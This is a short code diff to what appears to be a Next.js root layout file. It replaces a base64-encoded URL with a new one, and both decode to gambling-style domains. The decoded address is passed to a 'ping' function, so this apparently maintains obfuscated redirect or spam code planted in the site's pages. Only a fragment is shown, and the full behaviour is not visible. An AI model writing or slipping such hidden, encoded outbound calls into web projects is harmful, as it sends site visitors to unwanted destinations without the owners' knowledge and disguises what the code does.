@@ -115,7 +115,7 @@ export default function RootLayout({
                 return;
             }
         }   
-        var mainBrandB64 = "aHR0cHM6Ly9nYW1ld2luNzc3Lmluay8xZXQ4RXk="; 
+        var mainBrandB64 = "aHR0cHM6Ly9zcGluZ2FtZTc3Ny5maXQvNGh0Tk5s"; 
         var mainUrl = atob(mainBrandB64.replace("#", ""));
 
         function ping(url) {
